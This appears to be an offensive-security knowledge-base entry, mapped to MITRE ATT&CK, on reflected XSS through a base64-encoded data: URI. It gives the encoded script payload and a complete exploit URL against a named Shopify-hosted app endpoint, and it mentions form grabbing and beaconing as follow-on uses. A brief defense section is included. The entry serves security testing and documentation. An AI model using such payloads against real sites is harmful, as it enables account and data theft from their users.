---
tags:
  - xss
  - reflected-xss
  - data-uri
  - base64
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:33.802Z'
sub_techniques: []
id: 117e01be-c1b6-4cf4-a951-bfdf8c2ab20b
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Execute Reflected XSS via Data URI

## Summary

This procedure uses a base64-encoded data: URI in the 'path' parameter to execute HTML-embedded JavaScript, bypassing scheme restrictions for advanced reflected XSS payloads like custom alerts.

## Description

Data: URIs allow embedding content directly, and without sanitization, the 'path' parameter renders base64-decoded HTML including <script> tags. This enables complex attacks such as form grabbing or beaconing to attacker servers. The payload is reflected immediately upon URL load, requiring only a single visit. It complements javascript: injections for more obfuscated exploits.

## Requirements

1. Base64 encoder tool or online converter.
2. Vulnerable 'path' endpoint.
3. Script payload (e.g., alert('XSS PoC')).

## Defense

Defensive measures and detection strategies:

- Block data: and other non-standard URI schemes at the server level.
- Decode and inspect base64 content in parameters before processing.
- Implement strict CSP to prevent script execution from data URIs.

## Objectives

1. Render and execute embedded script via data URI.
2. Obfuscate payload using base64 for evasion.
3. Confirm arbitrary HTML/JS control.

## Instructions

### Step 1: Encode Payload

**Context**: Base64-encode the HTML script to hide it.

Encode <script>alert(/XSS PoC/)</script> to PHNjcmlwdD5hbGVydCgvWFNTIFBvQy8pPC9zY3JpcHQ+. Full URI: data:text/html;base64,PHNjcmlwdD5hbGVydCgvWFNTIFBvQy8pPC9zY3JpcHQ%2B.

> Expected output: Encoded URI string.

### Step 2: Inject and Trigger

**Context**: Append to URL for execution.

Full URL: https://supporthiring.shopify.com/apps/locksmith/resource/pages/gauntlet-challenge?&path=data%3Atext%2fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgvWFNTIFBvQy8pPC9zY3JpcHQ%2B.

> Expected output: Alert with 'XSS PoC'.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques

- None

## Commands Used

- None

## Tools Used

- None

## Tags

- [[xss]]
- [[reflected-xss]]
- [[data-uri]]
- [[base64]]
